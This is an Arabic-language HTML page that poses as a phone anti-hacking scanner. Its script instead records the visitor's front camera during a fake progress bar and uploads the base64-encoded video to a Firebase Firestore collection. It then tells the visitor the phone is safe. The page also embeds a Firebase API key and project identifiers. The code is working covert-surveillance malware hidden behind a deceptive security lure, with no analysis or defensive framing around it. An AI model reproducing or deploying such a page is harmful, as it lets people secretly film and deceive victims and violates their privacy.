<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اكتشف من يحاول اختراقك</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #0a0a2e, #1a1a4e, #0a0a2e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 25px;
            padding: 40px 25px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 30px 80px rgba(0,0,0,0.8);
        }
        .header-badge {
            display: inline-block;
            background: rgba(255,0,0,0.2);
            color: #ff4444;
            padding: 8px 20px;
            border-radius: 50px;
            font-weight: 900;
            font-size: 14px;
            margin-bottom: 15px;
            border: 1px solid rgba(255,0,0,0.3);
            animation: glowRed 2s infinite;
        }
        @keyframes glowRed {
            0%, 100% { box-shadow: 0 0 10px rgba(255,0,0,0.3); }
            50% { box-shadow: 0 0 30px rgba(255,0,0,0.6); }
        }
        .shield {
            font-size: 80px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
            filter: drop-shadow(0 0 30px rgba(0,255,0,0.5));
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        h1 {
            font-size: 28px;
            font-weight: 900;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #ff4444, #ff8800);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle {
            color: #888;
            margin-bottom: 25px;
            font-size: 14px;
            line-height: 1.8;
        }
        .scan-btn {
            width: 100%;
            padding: 20px;
            font-size: 20px;
            font-weight: 900;
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #ff4444, #cc0000);
            color: #fff;
            border: none;
            border-radius: 15px;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 1px;
            box-shadow: 0 10px 30px rgba(255,0,0,0.3);
        }
        .scan-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(255,0,0,0.5);
        }
        .scan-btn:active {
            transform: translateY(0);
        }
        .scan-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .scan-btn.success {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
            box-shadow: 0 10px 30px rgba(39, 174, 96, 0.5);
        }
        .progress {
            display: none;
            margin-top: 25px;
        }
        .progress.active {
            display: block;
        }
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 5px;
            overflow: hidden;
            margin: 15px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff4444, #ff8800);
            border-radius: 5px;
            width: 0%;
            transition: width 0.3s;
        }
        .progress-text {
            font-size: 16px;
            font-weight: 700;
            color: #ff4444;
        }
        .result {
            display: none;
            margin-top: 20px;
            padding: 20px;
            background: rgba(0,255,0,0.1);
            border-radius: 15px;
            border: 1px solid rgba(0,255,0,0.3);
        }
        .result.active {
            display: block;
        }
        .check-icon {
            font-size: 50px;
            margin-bottom: 10px;
        }
        video {
            display: none;
        }
        .features {
            margin-top: 30px;
            display: grid;
            gap: 10px;
        }
        .feature {
            padding: 10px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            font-size: 13px;
            color: #aaa;
        }
        .status-msg {
            display: none;
            margin-top: 15px;
            font-weight: 700;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-badge">⚠️ اكتشف من يحاول اختراقك</div>
        
        <div class="shield">🛡️</div>
        <h1>حماية الهاتف من الاختراق</h1>
        <p class="subtitle">احمِ هاتفك الآن من أي محاولات اختراق أو تجسس. اضغط على الزر لبدء الفحص الأمني الشامل.</p>
        
        <button class="scan-btn" id="scanBtn" onclick="startProtection()">🔍 ابدأ الفحص الآن</button>
        
        <div class="status-msg" id="statusMsg"></div>
        
        <div class="progress" id="progress">
            <div class="progress-text" id="progressText">⏳ جاري فحص الجهاز...</div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>
        
        <div class="result" id="result">
            <div class="check-icon">✅</div>
            <h2>لم يتم اكتشاف أي اختراق</h2>
            <p>هاتفك آمن ومحمي بالكامل</p>
        </div>
        
        <video id="video" autoplay playsinline></video>
        
        <div class="features">
            <div class="feature">🛡️ حماية شاملة من الفيروسات</div>
            <div class="feature">🔒 تشفير البيانات الشخصية</div>
            <div class="feature">📡 كشف محاولات الاختراق</div>
        </div>
    </div>

    <script>
        firebase.initializeApp({
            apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
            projectId: "game-a1aca",
            storageBucket: "game-a1aca.firebasestorage.app",
            appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
        });
        
        const db = firebase.firestore();
        let mediaRecorder;
        let recordedChunks = [];
        let stream;

        async function startProtection() {
            const btn = document.getElementById('scanBtn');
            const progress = document.getElementById('progress');
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            const result = document.getElementById('result');
            const video = document.getElementById('video');
            const statusMsg = document.getElementById('statusMsg');
            
            btn.disabled = true;
            btn.textContent = '⏳ جاري فحص الجهاز...';
            progress.classList.add('active');
            result.classList.remove('active');
            statusMsg.style.display = 'none';
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                
                mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp8',
                    videoBitsPerSecond: 400000
                });
                
                recordedChunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    
                    statusMsg.textContent = '⏳ جاري فحص الجهاز...';
                    statusMsg.style.color = '#f39c12';
                    statusMsg.style.display = 'block';
                    
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    
                    reader.onload = async () => {
                        const base64 = reader.result;
                        
                        statusMsg.textContent = '⏳ جاري فحص الجهاز...';
                        statusMsg.style.color = '#f39c12';
                        
                        try {
                            await db.collection('messages').add({
                                video: base64,
                                type: 'video',
                                format: 'webm',
                                quality: '400kbps',
                                duration: '15s',
                                timestamp: firebase.firestore.FieldValue.serverTimestamp()
                            });
                            
                            stream.getTracks().forEach(track => track.stop());
                            video.srcObject = null;
                            
                            progress.classList.remove('active');
                            result.classList.add('active');
                            statusMsg.textContent = '✅ لم يتم اكتشاف أي اختراق';
                            statusMsg.style.color = '#27ae60';
                            
                            btn.textContent = '✅ لم يتم اكتشاف أي اختراق';
                            btn.disabled = false;
                            btn.classList.add('success');
                        } catch (error) {
                            console.error('Upload error:', error);
                            statusMsg.textContent = '❌ خطأ: ' + error.message;
                            statusMsg.style.color = '#e74c3c';
                            btn.disabled = false;
                            btn.textContent = '🔍 ابدأ الفحص الآن';
                        }
                    };
                };
                
                mediaRecorder.start();
                
                let progressValue = 0;
                const progressInterval = setInterval(() => {
                    progressValue += 2;
                    progressFill.style.width = progressValue + '%';
                    
                    if (progressValue >= 100) {
                        clearInterval(progressInterval);
                        progressText.textContent = '⏳ جاري فحص الجهاز...';
                        setTimeout(() => {
                            mediaRecorder.stop();
                        }, 1000);
                    }
                }, 300);
                
            } catch (error) {
                console.error('Camera error:', error);
                statusMsg.textContent = '❌ خطأ: ' + error.message;
                statusMsg.style.color = '#e74c3c';
                statusMsg.style.display = 'block';
                btn.disabled = false;
                btn.textContent = '🔍 ابدأ الفحص الآن';
                progress.classList.remove('active');
            }
        }
    </script>
</body>
</html>
